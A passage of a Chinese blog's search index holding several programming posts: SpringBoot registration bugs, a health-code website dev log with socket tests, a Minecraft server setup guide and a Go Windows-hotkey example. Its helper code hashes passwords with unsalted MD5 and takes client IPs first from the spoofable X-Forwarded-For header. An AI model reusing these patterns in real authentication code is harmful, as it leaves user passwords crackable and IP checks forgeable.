流\n","categories":["编程记录"],"tags":["lambda","bug","反射"]},{"title":"关于Schiphalast注册功能开发中的bug","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E5%85%B3%E4%BA%8ESchiphalast%E6%B3%A8%E5%86%8C%E5%8A%9F%E8%83%BD%E5%BC%80%E5%8F%91%E4%B8%AD%E7%9A%84bug/","content":"简介这个功能写成了一个springboot项目，部署在taptap的云引擎上。taptap云引擎官方文档使用了官方提供的命令行工具，创建项目和部署到云引擎。命令行文档他生成的项目实际是springboot的改版，添加了一些他们独有的功能。比如云函数等。实际开发与平时一致（他们提供的功能其实基本没用到，或许以后会用到。\n另外，要吐槽的一个点就是：项目生成默认配置使用的是Java11，但是部署到云引擎时，报错。换成Java8后正常运行。版本问题，影响不大。新版任你发，我用Java 8。\n可复用模块从请求中获取ip地址Remote Address：Remote Address代表HTTP请求的远程地址，即请求的源地址。http协议在三次握手时时用的就是这个Remote Address地址，发送响应报文时也是使用的这个Remote Address地址。所以，Remote Address地址是不能伪造的，否则请求者会收不到响应报文。\n\n但是，**http请求经过代理服务器转发时，用户真实ip会丢失。**所以有了X-Forwarded-For获取ip的方式。\n\nX-Forwarded-For：为了避免真实ip的丢失，代理服务器会增加叫X-Forwarded-For的头信息。将客户端ip记录到其中，以保证服务器可以获取到客户端真实ip。X-Forwarded-For是一个拓展头。虽然HTTP&#x2F;1.1（RFC 2616）协议并没有对它的定义，但它已经成为事实上的标准（都在用X-Forwarded-For请求头格式：X-Forwarded-For: client, proxy1, proxy2第一个便是请求的原始ip，后面则是代理服务器的ip。\n\n由于请求头可以伪造，所以不要相信请求头中携带的ip信息。\n\n\n直接对外提供服务的 Web 应用，在进行与安全有关的操作时，只能通过 Remote Address 获取 IP，不能相信任何请求头；使用 Nginx 等 Web Server 进行反向代理的 Web 应用，在配置正确的前提下，要用 X-Forwarded-For 最后一节 或 X-Real-IP 来获取 IP（因为 Remote Address 得到的是 Nginx 所在服务器的内网 IP）；同时还应该禁止 Web 应用直接对外提供服务；在与安全无关的场景，例如通过 IP 显示所在地天气，可以从 X-Forwarded-For 靠前的位置获取 IP，但是需要校验 IP 格式合法性；\n\n参考文章：关于X-Forwarded-For的介绍HTTP 请求头中的 X-Forwarded-For\n代码：\n/** * 从HttpServletRequest中获取ip * @param request 请求 * @return ip */public static String getIP(HttpServletRequest request) &#123;    String ip = request.getHeader(&quot;x-forwarded-for&quot;);    if (ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip = request.getHeader(&quot;Proxy-Client-IP&quot;);    &#125;    if (ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip = request.getHeader(&quot;X-Forwarded-For&quot;);    &#125;    if (ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip = request.getHeader(&quot;WL-Proxy-Client-IP&quot;);    &#125;    if (ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip = request.getHeader(&quot;X-Real-IP&quot;);    &#125;    if (ip == null || ip.length() == 0 || &quot;unknown&quot;.equalsIgnoreCase(ip)) &#123;        ip = request.getRemoteAddr();        if (&quot;127.0.0.1&quot;.equalsIgnoreCase(ip) || &quot;0:0:0:0:0:0:0:1&quot;.equalsIgnoreCase(ip)) &#123;            // 根据网卡取本机配置的 IP            InetAddress iNet = null;            try &#123;                iNet = InetAddress.getLocalHost();            &#125; catch (UnknownHostException e) &#123;                e.printStackTrace();            &#125;            if (iNet != null)                ip = iNet.getHostAddress();        &#125;    &#125;    // 对于通过多个代理的情况，分割出第一个 IP    if (ip != null &amp;&amp; ip.length() &gt; 15) &#123;        if (ip.indexOf(&quot;,&quot;) &gt; 0) &#123;            ip = ip.substring(0, ip.indexOf(&quot;,&quot;));        &#125;    &#125;    return &quot;0:0:0:0:0:0:0:1&quot;.equals(ip) ? &quot;127.0.0.1&quot; : ip;&#125;\n\n密码的md5加密MD5，全称 消息摘要算法第五版（Message Digest Algorithm 5）不多介绍，详见MD5百度百科\n关于加密算法的改进：\n\n加盐 即在原来的明文中加入一组随机串，再通过加密算法加密，将密文存入数据库。\n加次数 即多加密几次，增加破解难度。不过会消耗更多计算资源。\n\njdk自带api：\n/** * md5加密 * @param password 需要加密的字符串 * @return 加密后的字符串 */public static String md5(String password)&#123;    String hashedPwd = null;    try &#123;        //生成MessageDigest对象，指定使用的消息摘要算法        MessageDigest md = MessageDigest.getInstance(&quot;MD5&quot;);        //传入需要计算的字符串，传入参数为字节或字节数组        md.update(password.getBytes());        /*        digest()计算消息摘要，返回值为字节数组。16个字节，128bit        通过BigInteger将其转换成32位的16进制数（每个字节用两个16进制数表示）        或者16位16进制数，去掉32位前后各8位         */        hashedPwd = new BigInteger(1, md.digest()).toString(16);    &#125; catch (NoSuchAlgorithmException e) &#123;        e.printStackTrace();    &#125;    return hashedPwd;&#125;\n\nspring的DigestUtils工具类\npublic static String md5(String password) &#123;    // 基于spring框架中的DigestUtils工具类进行密码加密    return DigestUtils.md5DigestAsHex((password).getBytes());&#125;\n\n发送mail邮件使用JavaMail发送邮件\n依赖：\n&lt;!--javamail的依赖--&gt;&lt;dependency&gt;    &lt;groupId&gt;javax.mail&lt;/groupId&gt;    &lt;artifactId&gt;mail&lt;/artifactId&gt;    &lt;version&gt;1.4.7&lt;/version&gt;&lt;/dependency&gt;\n代码：\n//邮件服务器地址（比如smtp.qq.comprivate static final String mailHost = null;//邮件传输协议（通常为smtpprivate static final String mailTransportProtocol = &quot;smtp&quot;;//邮箱认证（即登录private static final String mailSmtpAuth = &quot;true&quot;;//发件人邮箱地址private static final String fromEmail = null;//发件人邮箱密码private static final String password = null;/** * 发送邮件 * @param toEmail 发往邮箱地址 */public static void sendMail(String toEmail)&#123;    //发送的内容（可以是dom文档    String sendContent = &quot;test mail&quot;;    //创建，发送邮件    Properties prop = new Properties();    prop.setProperty(&quot;mail.host&quot;, mailHost);    prop.setProperty(&quot;mail.transport.protocol&quot;, mailTransportProtocol);    prop.setProperty(&quot;mail.smtp.auth&quot;, mailSmtpAuth);    //使用JavaMail发送邮件的5个步骤    //1、创建session    Session session = Session.getInstance(prop);    //2、通过session得到transport对象    Transport ts;    try &#123;        ts = session.getTransport();        //3、使用邮箱的用户名和密码连上邮件服务器，发送邮件时，发件人需要提交邮箱的用户名和密码给smtp服务器，用户名和密码都通过验证之后才能够正常发送邮件给收件人。        ts.connect(mailHost, fromEmail, password);        //4、创建邮件        MimeMessage message = new MimeMessage(session);        //指明邮件的发件人        message.setFrom(new InternetAddress(fromEmail));        //指明邮件的收件人        message.setRecipient(Message.RecipientType.TO, new InternetAddress(toEmail));        //邮件的标题        message.setSubject(&quot;标题&quot;);        //邮件的文本内容        message.setContent(sendContent, &quot;text/html;charset=UTF-8&quot;);        //5、发送邮件        ts.sendMessage(message, message.getAllRecipients());        ts.close();    &#125; catch (MessagingException e) &#123;        e.printStackTrace();    &#125;&#125;\n\n参考文章：使用JavaMail创建邮件和发送邮件\n\n使用springboot集成的mail模块\n依赖：\n&lt;dependency&gt;    &lt;groupId&gt;org.springframework.boot&lt;/groupId&gt;    &lt;artifactId&gt;spring-boot-starter-mail&lt;/artifactId&gt;&lt;/dependency&gt;\n配置：\nspring.mail.protocol=spring.mail.host=spring.mail.username=spring.mail.password=\n代码：\n@Resourceprivate JavaMailSender javaMailSender;@Value(&quot;$&#123;fromEmail&#125;&quot;)private String fromEmail;/** * 发送邮件 * @param toEmail 发往邮箱地址 */public static void sendMail(String toEmail)&#123;    //发送的内容（可以是dom文档    String sendContent = &quot;test mail&quot;;    try &#123;        MimeMessageHelper messageHelper = new MimeMessageHelper(javaMailSender.createMimeMessage(), true);        messageHelper.setFrom(fromEmail);        messageHelper.setTo(toEmail);        messageHelper.setSubject(&quot;标题&quot;);        messageHelper.setText(sendContent, true);        javaMailSender.send(messageHelper.getMimeMessage());    &#125; catch (MessagingException e) &#123;        e.printStackTrace();    &#125;&#125;\n\njdbc数据库连接池（鸽了）因为建立数据库连接与关闭数据库连接是非常耗时的事情，如果每次查询都建立连接、关闭连接会产生很大的性能开销。所以有了连接池的出现来解决这一问题。即在程序启动时，初始化连接池（连接数据库，创建多个连接）。在需要使用时从连接池中获取连接，使用结束放回连接池。以减少性能开销。\n代码：\n先鸽了\n\n附DataSource的产出背景：DataSource，一个被严重低估的接口\nbug及解决方案session变化现象ajax请求及其余请求在前几次请求时，session会发送变化。导致存在session中的数据获取不到。\n原因通过HttpServletRequest获取session对象时，使用 request.getSession() 方法。getSession方法会检测当前是否有session存在，默认不存在会创建一个新的session，存在则返回。\najax请求跨域请求默认不携带cookie信息。即获取不到session\n解决方案（未解决）调用getSession方法时传入参数false或true例如：request.getSession(false);为true时，先查看请求时是否有sessionID。如果没有，则创建一个新的session对象。如果有则根据sessionID查找对应的session对象，找到了就返回该session对象，没找到就创建新的session对象。为false时，先查看请求中是否有sessionID，没有则返回null。有则根据sessionID查找对应的session对象，找到了就返回该session对象，没找到就创建新的session对象。默认为true\n建议：往session中写入参数时使用 request.getSession();从session中读取参数时使用 request.getSession(false);\n附session其他操作：设置值：session.setAttribute(String name,Object obj);读取值：session.getAttribute(String name);删除session：session.invalidate();\n\n让ajax请求携带参数添加属性：xhr.withCredentials=true\n附js原生实现ajax请求：\nvar Ajax = &#123;        get: function (url, callback) &#123;            // XMLHttpRequest对象用于在后台与服务器交换数据            var xhr = new XMLHttpRequest();            xhr.open(&#x27;GET&#x27;, url, false);            xhr.onreadystatechange = function () &#123;                // readyState == 4说明请求已完成                if (xhr.readyState == 4) &#123;                    if (xhr.status == 200 || xhr.status == 304) &#123;                        console.log(xhr.responseText);                        callback(xhr.responseText);                    &#125;                &#125;            &#125;            xhr.send();        &#125;,        // data应为&#x27;a=a1&amp;b=b1&#x27;这种字符串格式，在jq里如果data为对象会自动将对象转成这种字符串格式        post: function (url, data, callback) &#123;            var xhr = new XMLHttpRequest();            xhr.open(&#x27;POST&#x27;, url, false);            // 跨域携带cookie            xhr.withCredentials=true            // 添加http头，发送信息至服务器时内容编码类型            xhr.setRequestHeader(&#x27;Content-Type&#x27;, &#x27;application/x-www-form-urlencoded&#x27;);            xhr.onreadystatechange = function () &#123;                if (xhr.readyState === 4) &#123;                    if (xhr.status === 200 || xhr.status === 304) &#123;                        // console.log(xhr.responseText);                        callback(xhr.responseText);                    &#125;                &#125;            &#125;            xhr.send(data);        &#125;    &#125;\n\n说明：这个bug其实并未解决，因为部署到tap云引擎时，是一个springboot项目。所有的请求应该都是同源的，不会出现跨域的情况。而session变化原因，就是getSession会创建新的session对象。将getSession传入false，同时改完ajax属性后，这个bug依旧会出现。在部署到生产环境后，依旧有用户偶尔会出现了session为null的情况。\n\n2022-08-12 暂未解决。\n\n总结第一次使用平台提供的自动化的部署和管理功能。有部署状态（预备环境和生产环境）、请求统计、日志、及环境变量各种设置等。taptap云服务还是很成熟的。相比自己在腾讯云服务器上使用要方便很多，不管是部署还是监控。官方文档也相对很齐全，参看文档来使用是完全可以的。\n","categories":["编程记录"],"tags":["java","session","bug","MD5","ip","mail","数据库连接池"]},{"title":"关于健康码识别的网站开发进度","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E5%85%B3%E4%BA%8E%E5%81%A5%E5%BA%B7%E7%A0%81%E8%AF%86%E5%88%AB%E7%9A%84%E7%BD%91%E7%AB%99%E5%BC%80%E5%8F%91%E8%BF%9B%E5%BA%A6/","content":"关于这个网站这个网站是大创项目的网站。用于健康码识别，目前什么都没有，只有一个空项目。啊，对，没错。github仓库地址  \n关于网站的架构网站前端打算使用vue，前端由青虬负责编写网站后端打算使用springboot，由我负责项目核心功能由顾のEvery Day负责，他也是这个项目的负责人（组长）。 图像识别那块，我暂时还不是很懂啦，反正很厉害就对了前后端肯定是要分离的，使用ajax，数据格式使用json。 jsp不分离属实痛苦后端与图像识别的python程序，目前打算使用socket（套接字）进行通信。 目前只是了解过，还需要学习而且临近期末，springboot暂时还没学完，所以开发进度在七月前估计会很慢。 可能根本没有进度  \n目前进度：确认大体需求\n\n2022-05-21周六，楼下的广场舞很吵。\n\n数据库设计数据库设计了四张表，老师、学生、权限、班级因为需求比较简单，比如权限暂时只有两种——能否查看统计信息，所以并没有采取复杂的角色和权限表。同时因为对学院和专业没有什么明确的实际操作，所以写在了班级中，并未单独分表。关于学生健康码信息的表，目前计划动态新建表，即每天新建一张表用于存储健康码的相关信息\n目前进度：创建数据库，搭建项目基本配置\n\n2022-07-05果然七月前完全没有进度，紧张的期末也终于是结束了。python实训（网课）开始了。（还有几门成绩还不出，是不打算出了吗）\n\n具体开发过程注册部分（未完成注册部分使用邮箱进行验证，使用到了springboot自带的mail组件。还挺好用的，和之前使用的javax.mail的大体流程（邮件的设置之类的）是一样的。同时也决定使用redis数据库，来解决同一用户使用不同浏览器或设备来进行邮件验证的数据共享问题。比之前采取静态类存取sessionId的方式会好一些。最后，在发送邮件的调试过程中，我也决定使用日志来打印一些信息，进行排错，而非System.out.println()。  \n目前进度：大概完成了注册的三分之一。\n\n2022-07-08今天也算是见证历史了，日本前首相安倍晋三今天中午遇刺，下午宣布死亡。考虑以后可以给博客添加上类似历史上的今天这类tips。应该会有意义吧  \n\n老师注册部分（基本完成注册的流程大概如下：  \n\n发送注册请求\n生成验证码，将验证码同用户信息一起写入redis，发送验证邮件\n访问验证链接\n验证验证码是否正确\n正确则修改redis中的数据，将用户改为在线状态，用户邮箱写入cookie，同时修改它们的生命周期（方便后期登录使用），发送注册成功的邮件，写入数据库\n错误则返回错误信息\n\n\n\nredis中缓存的信息也从原来的string改成了hash，因为考虑到登录会使用，所以缓存中用户信息得记录详细。关于验证的链接，返回的是html页面，使用的是thymeleaf，其实不太想用的，但总不能返回个json数据吧。因为页面显示完信息后，应该会3s后跳转到首页。比jsp方便了一些吧。（暂时没有好的处理方式最后就是关于Controller层和Service层的一些想法。业务层应该把这个请求分解成一个个服务，不同的请求也可以重用服务，提高代码的复用性。dao层就只做与数据库的交互。对于Controller层和Service层的划分和设计，目前设计的还不是很好。得多写多看吧。  \n\n2022-07-10脑子有点乱，去睡会觉。想把个人介绍写写，但还没想好怎么写。\n\n重新设计想了想，现在的注册虽然完成了，但是过于复杂。在邮件里嵌入链接进行验证是一个不太聪明的行为。所以决定重新设计下使用流程：  \n\n注册\n输入图片验证码，发送带有验证码的邮件。  \n同一页面，输入邮件的验证码提交后。即注册完成\n\n\n登录\n账号，密码，图片验证码。  \n正确则登陆成功\n\n\n忘记密码\n输入图片验证码，发送带有验证码的邮件。\n同一页面，输入邮件的验证码以及新密码提交后。即重置完成\n\n\n\n顺带把接口写好，需要什么，返回什么得提前规划好。\n\n2022-07-11脑子不是一般的乱，之前的设计问题很大。虽然也不是不能实现。好的设计会让程序更加简洁高效，接口写了一部分，先实现这部分。\n\n被大佬推荐了两个工具自动生成api文档的swagger包，经过一番调试，终于能正常的扫描到controller中的所有api了。后面要使用他的注解来使生成的api更详细。还有个就是Apifox，可以模拟各种请求，方便了调试。同时，也支持将swagger生成的api数据导入。也可以多人协同开发。应该会蛮好用的。  \n\n2022-07-11晚上补充，重构真痛苦啊。在博客上写的接口文档就不用了，不如软件生成的。害，亏我写了蛮久的\n\n注册功能，重新写好了。比之前的逻辑简单了许多。重置密码的流程和注册是一样的，也方便后面开发。使用spring-session-data-redis。把数据存到session中，session把数据存到redis，实现数据共享。（不存redis问题好像也不大，因为改变了设计，不在邮件中夹杂链接，所以不需要考虑用户不同源访问的数据共享问题。这个依赖包是解决分布式session共享的问题的，用在这感觉没啥必要，纯session存储就足够了。不过都写好了也无所谓了）  \n\n2022-07-13昨天忘写了。python实训布置了最后的大作业，就做个东西交上去，也没什么限制。我到现在也没想好要做啥，这几天要暂停去写大作业了。\n\n注册，登录，重置的接口基本实现了，但是没有完整的测试。昨天试着写了上传图片的模块，还行，能上传，问题不大。后面要考虑如何和python程序进行数据交互了。所以暂时缓一缓，因为负责python的人跑去上夜班了，没啥时间交流。所以这几天先学学nginx吧。后面部署还是我。nginx看完再考虑别的。  \n\n2022-07-20python实训的大作业交了个qq机器人，也不知道老师能不能跑起来。等python熟练点了，把qq机器人的配置和部署记录下。\n\n测试socketjava客户端：\npackage org.example;import java.io.InputStream;import java.io.OutputStream;import java.net.Socket;public class Client &#123;    public static void main(String args[]) &#123;        // 要连接的服务端IP地址和端口        String host = &quot;124.222.100.205&quot;;        int port = 55533;        // 与服务端建立连接        Socket socket = new Socket(host, port);        // 建立连接后获得输出流        OutputStream outputStream = socket.getOutputStream();        String message = &quot;你好 socket test1!&quot;;        socket.getOutputStream().write(message.getBytes(&quot;UTF-8&quot;));        //通过shutdownOutput高速服务器已经发送完数据，后续只能接受数据        socket.shutdownOutput();        InputStream inputStream = socket.getInputStream();        byte[] bytes = new byte[1024];        int len;        StringBuilder sb = new StringBuilder();        while ((len = inputStream.read(bytes)) != -1) &#123;            //注意指定编码格式，发送方和接收方一定要统一，建议使用UTF-8            sb.append(new String(bytes, 0, len, &quot;UTF-8&quot;));        &#125;        System.out.println(&quot;get message from server: &quot; + sb);        inputStream.close();        outputStream.close();        socket.close();    &#125;&#125;\npython服务端：\nimport sockethost = &#x27;0.0.0.0&#x27;port = 55533try:    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.bind((host, port))      s.listen(1) except socket.error:    print(&#x27;create socket failed&#x27;)print(&#x27;socket created&#x27;)while 1:    conn, addr = s.accept()    print(&quot;from&quot; + str(addr))    while 1:        data = conn.recv(1024)        if len(data) == 0:            conn.send(&#x27;end&#x27;.encode())        else:            print(data.decode())            conn.send(&#x27;end&#x27;.encode())        break    conn.close()\n\n客户端报错：Connection timed out: connect原因：服务器端口未开放\n客户端报错：Connection refused: connect原因：服务端监听端口为 127.0.0.1:55533，但127.0.0.1表示本机地址，即客户端与服务端同时运行在这台服务器上才能进行连接。所以需要绑定到网卡的ip，或者使用0.0.0.0绑定到所有的网络地址。\n\n2022-07-30\n\nsocket通信，也许会使用队列，一个个发给python端。但这样好像效率不高。另一种方式是采取类似数据库连接池的方法，或者多线程。\n\n2022-08-01讨论了一下，边写边想吧。\n\n结束一句话，寄了。\n","categories":["编程记录"],"tags":["java","socket","SpringBoot"]},{"title":"如何搭建minecraft服务器","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E5%A6%82%E4%BD%95%E6%90%AD%E5%BB%BAminecraft%E6%9C%8D%E5%8A%A1%E5%99%A8/","content":"前言首先来简单介绍下 minecraft 的服务端。服务端主要有 Bukkit、Spigot、Paper、Sponge 等。主要提供接口以供开发插件。模组加载器主要有 forge、fabric 等。主要也是提供接口以提供额外的功能，主要是兼容各个模组不互相冲突。（该冲突的还是躲不掉的）\n插件与模组的主要区别是：\n\n插件是增加游戏内容，而不修改。但模组可以修改游戏内容，增加新的东西（物品&#x2F;生物等等，但插件做不到）。\n插件运行在服务端。模组则是服务端客户端都可以运行。\n\n这里主要内容是搭建，关于插件与模组的编写不做过多介绍（主要我也没怎么写过插件和模组）。这里贴几个链接：\n以下主要是官网，因为 minecraft 的插件和模组官方并不提供，属于第三方社区开发和维护（为爱发电）\nforge 官网spigot 与 Bukkit 官网Paper 官网\n我认为比较好的教程：Bukkit API 教程开服教程szszss大佬的博客 大佬的博客主要有模组与光影的编写教程\n前期准备首先得有一个服务端核心文件，上面所说的几个都可以。官网有服务端核心文件的下载链接。其次就是要注意 minecraft 与 Java 的版本关系。这里不列举了，下载时应该有（也许\n服务端核心文件为一个 jar 包。\n搭建这里我以 spigot-1.18.2 的核心作为示例。\n第一次运行核心 jar 文件\njava -jar spigot-1.18.2.jar\n当然，你也可以编写一个启动脚本，以配置启动环境以及更多的启动参数。\n第一次运行结束之后，会生成一些文件。需要修改的是 eula.txt ，同意 MINECRAFT 最终用户许可协议。如下：\neula=true\n\n其次就是 server.properties 。里面主要是服务器的一些配置项。包括端口号、正版验证、白名单、连接超时时间等等配置项。详细配置项可以 Google 一下\n修改完成后，第二次运行核心 jar在经过漫长的世界生成和加载之后，出现 done，便成功启动了。随后启动对应版本的游戏，在多人游戏中加入服务器即可（默认端口号为 25565）\n\n此时便可以多人游玩了，服务器搭建完成。\n其他众所周知，Java 是虚拟机语言，是跨平台的。所以以上操作在 linux 和 windows 中是完全一样的。当然，建议服务器使用 linux 并且使用 screen 在后台运行。\n云服务器注意防火墙给端口放行。\nbukkit、spigot 等插件服务端核心会生成 plugins 文件夹，用于存放插件。插件也是以 jar 包形式载入。forge、fabric 等模组服务端核心会生成 mods 文件夹，用于存放模组资源。模组也是以 jar 包形式载入。那么，模组与插件可不可以同时存在呢？答案是可以的，我找到一个项目，提供了几乎与所有插件和模组兼容的服务端核心。它叫 Mohist \nMohist 官网\n我下载了 mohist-1.18.2-8-server.jar Forge: 40.2.1 并成功地运行了。由于我并没有在它的服务端核心上测试运行模组和插件，所以不做过多的评价。\n一点点评价就是，我认为可以同时运行插件和模组是很酷的事情。模组提供更多的可玩性内容，插件提供更多服务器特色的内容。用于服务器的模组比较常见的有，匠魂、冰与火之歌、拔刀剑、工业、暮色、宝可梦、以及国产模组原初修真等。用于服务器的插件大多是定制的，像是登录、领地、地皮等功能，个性化程度较高。\nEND祝想要开服的小伙伴成功开服，并长期运营。\n《蓝易云》教程征集\n","categories":["编程记录"],"tags":["java","minecraft","服务器"]},{"title":"对桌面应用的一些想法","url":"/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E7%BC%96%E7%A8%8B%E8%AE%B0%E5%BD%95/%E5%AF%B9%E6%A1%8C%E9%9D%A2%E5%BA%94%E7%94%A8%E7%9A%84%E4%B8%80%E4%BA%9B%E6%83%B3%E6%B3%95/","content":"为什么想做桌面应用最近在学习 go 语言。产生了用 go 做点东西的想法。\n之前一直在学习 Java。Java 嘛，就是 spring 那套东西，做后端，写接口，操作数据库，连中间件。最后做出来的东西就是对外暴露的接口，没有界面。或者说大部分都是前端做的界面。最然我也会写 vue，用些组件也能做些好看的页面。但始终差点意思。\n我的意思是，那是个网站。需要服务器部署，需要网络，需要浏览器…他不是一个我想要的程序，它过于臃肿和专业。（当然，后面才发现还有更臃肿的。\n所以，我想做的或许是桌面程序。\n技术选型个人的桌面程序，理想状态肯定是要小而美的。所以选的标准就是 GUI界面和性能\n开发语言选择 go 作为开发语言。首先是因为我在学的缘故，想用它做点东西。另一方面就是界面渲染和后台任务肯定是异步的，go 在这方面有优势。也有助于我学习多线程。\nGUI 框架然后是 GUI 框架的选择。我不可能使用图形 api 直接去绘制 gui，这工作量是非常巨大，并且十分痛苦的。之前有使用 C++ 和 OpenGL 的经历，十分的痛苦。所以也十分佩服做 GUI 框架的人。\n一开始选择的时候，GUI 框架还是非常多的，不过水平参差不齐。主流的其实并不多可以参考下面的文章和一个知乎回答\n2022年5月，桌面软件开发框架大赏Go 语言这么强大，为什么没变成开发桌面软件主力语言呢？ - shaoyuan的回答 - 知乎\nGUI 大致分为两大类。一类是原生实现。基于自制的绘图引擎或者 SDL、GLW之类的绘图引擎。另一类就是跨平台的。基于浏览器绘制图形的 Electron 等，或者基于 Java 的 JavaFX、Swing 等。\n基本没什么可以选择的余地，因为开发语言是比较新的 go。\n首先选择使用的就是 Fynefyne githubfyne 是基于 OpenGL 和 GLFW 实现的。写出来的界面大概是下面这种风格\n说实话，不是我喜欢风格。并且 Fyne 也不支持自定义！打包出来的 exe 程序大小在 28MB 往上。所以劝退了。\n然后选择使用的是 (wails)[https://wails.io/]wails githubwails 可以看作为 Go 的快并且轻量的 Electron 替代品wails 不嵌入浏览器，因此性能高。它使用平台的原生渲染引擎。在 Windows 上，是基于 Chromium 构建的新 Microsoft Webview2 库。写出来的界面风格随意，因为前端是使用浏览器的那一套。下面是无边框，并且半透明，亚克力质感的界面。（页面完全自定义，所以白条也是自己写的，忽略就好\nwails 打包出来的 exe 程序大小在 8MB 往上，不过得依赖 webview2。处理 WebView2 运行时依赖到这都很好，下面是缺点。wails 是比较初级的，功能并没有那么完善。比如目前最高版本 v2.5.1 只支持单窗口应用、没有托盘图标、缺少一些系统事件（全局热键、聚焦失焦等）。总之，虽然界面上给了很多自由，但不透明的地方很多，主要是与操作系统交互的部分。看Wails v3 路线这些后续都会有吧，不过 v3 遥遥无期啊。\n架构方面这块是遇到问题请教 布拉 大佬的时候，给我说的一些建议。\n首先，布拉大佬是个喜欢函数式编程的人。他认为 go 的设计有问题。建议我换个语言。啊这，很难受啊。虽然我也觉得有设计不合理的地方，但应该是不会换了。尝试新语言大概是因为没有历史包袱吧（这里点名批评 C++\n然后就是架构上的建议。前后端分离，嗯，没错。桌面应用也这样。后端作为前端的守护进程，前端页面关闭多少次都无所谓，后端关闭就彻底关闭了。好处就是，可以多机一起用。（当然，我是没这个需求\n其实 wails 就是这么搞的，不过封装程度比较高，不透明，基本不能自定义。就那么一个窗口给你玩。很多应用也是这么搞的。不过对我来说，有点难啊。一点经验没有。因为前端实在是不想用 Electron ，这玩意打包出来实在是太大，难以接受。（跳佬写的聊天室软件，解压出来 223MB。也许有很好的减小体积的方法，不过每个 Electron 应用都包含了整个 V8 引擎和 Chromium 内核。我觉得不会小到哪里去。\n或许在 Windows 上，C++ 和 C# 才是小而美的最优解？\n补充Windows Api在使用 windows api 之前，要先了解一个东西，叫 windows 消息机制。基于 Windows 的应用程序是事件驱动的。 它们不会 (（如 C 运行时库调用）进行显式函数调用，) 获取输入。 而是等待系统向其传递输入。这里简单介绍下，详细参考微软的文档关于消息和消息队列\n一个 GUI 线程有一个消息队列，一个线程有多个窗口，所有窗口共享一个消息队列。比如按下鼠标右键，系统会产生一个消息 WM_RBUTTONDOWN 并将这个消息放到当前窗口所属线程的消息队列中。应用程序通过一个循环监听这个消息队列，不断从中获取消息，然后处理，做出相对的响应。\n消息的结构 msg 结构 (winuser.h)\ntypedef struct tagMSG &#123;  HWND   hwnd; // 接收消息的窗口句柄  UINT   message; // 消息的常量标识符（消息号）  WPARAM wParam; // 32位消息的附加信息  LPARAM lParam; // 32位消息的附加信息  DWORD  time; // 消息发布时间  POINT  pt; // 发布消息时光标在屏幕坐标系中的位置&#125; MSG, *PMSG, *NPMSG, *LPMSG;\n\n知道消息的结构和消息的机制之后，就可以调用 windows api 和系统进行一些交互了。下面用 go 演示注册 windows 热键\npackage mainimport (\t&quot;fmt&quot;\t&quot;syscall&quot;\t&quot;unsafe&quot;)// MSG 来自线程的消息队列的消息信息type MSG struct &#123;\tHWND   uintptr\tUINT   uintptr\tWPARAM int16\tLPARAM int64\tDWORD  int32\tPOINT  struct &#123;\t\tX int32\t\tY int32\t&#125;&#125;// 常量值 fsModifiers 参数可以是以下值的组合。const (\tModAlt = 1 &lt;&lt; iota\tModCtrl\tModShift\tModWin)// HotKey 热键的结构体type HotKey struct &#123;\tId        int // 唯一 id 标识\tModifiers int // 修饰符的常量值\tKeyCode   int // 按键的值&#125;var user32 *syscall.DLLvar registerHotKey *syscall.Procvar unregisterHotKey *syscall.Procvar peekMsg *syscall.Procvar waitMsg *syscall.Procfunc main() &#123;\t// 获取 dll 资源以调用 windows 系统 api\tuser32 = syscall.MustLoadDLL(&quot;user32&quot;)\tregisterHotKey = user32.MustFindProc(&quot;RegisterHotKey&quot;)\tunregisterHotKey = user32.MustFindProc(&quot;UnregisterHotKey&quot;)\tpeekMsg = user32.MustFindProc(&quot;PeekMessageW&quot;)\twaitMsg = user32.MustFindProc(&quot;WaitMessage&quot;)\t// 定义热键\tkeys := []*HotKey&#123;\t\t&#123;1, ModAlt, &#x27;Z&#x27;&#125;,            // ALT+Z\t\t&#123;2, ModAlt + ModShift, &#x27;X&#x27;&#125;, // ALT+SHIFT+X\t\t&#123;3, ModAlt + ModCtrl, &#x27;C&#x27;&#125;,  // ALT+CTRL+C\t&#125;\t// 注册热键\tfor _, hotkey := range keys &#123;\t\thotkey.registerOneHotKey()\t&#125;\tdefer func() &#123;\t\tfor _, hotkey := range keys &#123;\t\t\thotkey.unregisterOneHotKey()\t\t&#125;\t&#125;()\t// 监听消息\tfor &#123;\t\tvar msg = &amp;MSG&#123;&#125;\t\tres, _, _ := peekMsg.Call(uintptr(unsafe.Pointer(msg)), 0, 0, 0, 1)\t\tif res == 0 &#123;\t\t\t_, _, _ = waitMsg.Call(uintptr(unsafe.Pointer(msg)), 0, 0, 0, 1)\t\t&#125; else &#123;\t\t\t// 注册 id 在 WPARAM 字段\t\t\tif id := msg.WPARAM; id != 0 &#123;\t\t\t\t// 这里可以对按键进行分别处理\t\t\t\t// 这里就简单打印按了什么\t\t\t\thotKey := keys[id-1]\t\t\t\tfsModifiers := &quot;&quot;\t\t\t\tmodifier := hotKey.Modifiers\t\t\t\tfmt.Println(hotKey)\t\t\t\tif modifier%2 == 1 &#123;\t\t\t\t\tfsModifiers += &quot; alt&quot;\t\t\t\t&#125;\t\t\t\tmodifier = modifier &gt;&gt; 1\t\t\t\tif modifier%2 == 1 &#123;\t\t\t\t\tfsModifiers += &quot; ctrl&quot;\t\t\t\t&#125;\t\t\t\tmodifier = modifier &gt;&gt; 1\t\t\t\tif modifier%2 == 1 &#123;\t\t\t\t\tfsModifiers += &quot; shift&quot;\t\t\t\t&#125;\t\t\t\tmodifier = modifier &gt;&gt; 1\t\t\t\tif modifier%2 == 1 &#123;\t\t\t\t\tfsModifiers += &quot; win&quot;\t\t\t\t&#125;\t\t\t\tfmt.Printf(&quot;热键值:%s+%c\\n&quot;, 